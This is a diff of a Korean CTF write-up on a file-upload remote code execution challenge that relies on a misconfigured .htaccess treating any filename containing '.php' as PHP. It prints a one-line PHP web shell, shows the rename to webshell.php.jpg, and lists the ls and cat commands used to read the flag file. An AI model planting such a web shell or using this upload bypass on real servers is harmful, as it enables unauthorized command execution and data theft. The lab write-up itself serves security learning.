@@ -21,18 +21,20 @@ tags: [TIL, WEB, CTF]
 
 ## 목차
 
+1. [Vuln](#1-vuln)
+2. [Code](#2-code)
+    1. [.htaccess](#htaccess)
+    2. [upload.php](#uploadphp)
+3. [Payload](#payload)
+4. [참고](#참고)
+
 ---
 
 ## 1. Vuln
 
-File Upload
-RCE(Remote Code Execution)
+RCE(Remote Code Execution, 원격 코드 실행): 공격자가 조직의 컴퓨터나 네트워크에서 악성 코드를 실행하는 것을 말한다. 공격자가 제어하는 코드를 실행하는 기능은 추가 맬웨어를 배포하거나 중요한 데이터를 탈취하는 등 다양한 목적으로 사용될 수 있다.
 
 ## 2. Code
-
-### 디렉토리 구조
-
-asdf
 
 ### .htaccess
 
@@ -172,32 +174,41 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
 
 ## Payload
 
-Simple PHP Web shell code
+.htaccess의 잘못된 설정을 초점에 맞추고 진행했다.
 
-```php
-<?php
-echo shell_exec($_GET['cmd']);
-?>
-```
+1. Simple PHP Web shell code
 
-webshell.php → webshell.php.jpg로 변경 후 업로드
-![500x212](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-24-02-15-51.png)
+    ```php
+    <?php
+    echo shell_exec($_GET['cmd']);
+    ?>
+    ```
 
-![500x232](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-24-02-15-47.png)
+2. webshell.php → webshell.php.jpg로 변경 후 업로드
 
-uploads/20260223165901_3516_webshell.php.jpg
-![500x208](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-24-02-15-43.png)
+    ![500x212](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-24-02-15-51.png)
 
-`ls`
-![500x124](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-24-02-15-40.png)
+3. /upload에 접근
 
-`ls ..`
-![500x115](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-24-02-15-37.png)
+    ![500x232](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-24-02-15-47.png)
 
-`cat ../flag.txt`
-![500x101](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-24-02-06-21.png)
-> flag
+4. uploads/20260223165901_3516_webshell.php.jpg에 접근. 원래라면 jpg 이미로 처리되어야 하지만 .htaccess에서 .php가 파일명에 존재하면 php로 처리해버리기 때문에 php로 인식된 모습을 확인할 수 있다.
+
+    ![500x208](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-24-02-15-43.png)
+
+5. 리눅스 명령을 통해 flag 확인
+    1. `ls`
+       ![500x124](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-24-02-15-40.png)
+
+    2. `ls ..`
+        ![500x115](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-24-02-15-37.png)
+
+    3. `cat ../flag.txt`
+        ![500x101](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-24-02-06-21.png)
+        > flag
 
 ---
 
 ## 참고
+
+- [CLOUDFLARE: 원격 코드 실행이란?](https://www.cloudflare.com/ko-kr/learning/security/what-is-remote-code-execution/)
